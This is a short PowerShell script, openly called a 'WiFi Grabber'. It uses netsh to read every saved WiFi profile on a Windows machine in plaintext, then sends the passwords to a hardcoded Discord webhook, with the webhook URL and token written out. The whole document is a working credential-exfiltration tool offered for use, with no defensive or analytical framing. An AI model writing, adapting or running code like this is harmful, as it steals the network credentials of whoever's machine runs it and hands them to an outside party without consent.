# WiFi Grabber Script - Collects WiFi passwords and sends them to a Discord Webhook

try {
    # Step 1: Collect saved WiFi profiles
    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ": ")[1].Trim() }

    # Initialize variable to store WiFi credentials
    $wifiCreds = ""

    # Step 2: Loop through each profile and extract the password (if available)
    foreach ($profile in $wifiProfiles) {
        $details = netsh wlan show profile name="$profile" key=clear | Select-String "(SSID name|Key Content)"
        $wifiCreds += "`nProfile: $profile`n$details`n"
    }

    # Step 3: Prepare the Discord Webhook URL (Replace with your own)
    $webhookUrl = "https://discord.com/api/webhooks/1299731417290375279/pfX2RVqzHPbZDbdw97pCiSZ9keXRQlRyEul7Wbisgvjw9pbbpLEyr_ZAIXTEQ-VUhbUP"

    # Step 4: Prepare the JSON payload for the Discord message
    $body = @{
        content = "WiFi Credentials Grabbed:`n```$wifiCreds```"
    } | ConvertTo-Json -Depth 10

    # Step 5: Send the WiFi credentials to the Discord webhook
    Invoke-RestMethod -Uri $webhookUrl -Method POST -Body $body -ContentType 'application/json'

} catch {
    # Step 6: Handle any errors and log them to a local file for debugging
    "Error: $($_.Exception.Message)" | Out-File -FilePath "C:\temp\wifi_grabber_error.log" -Append
}
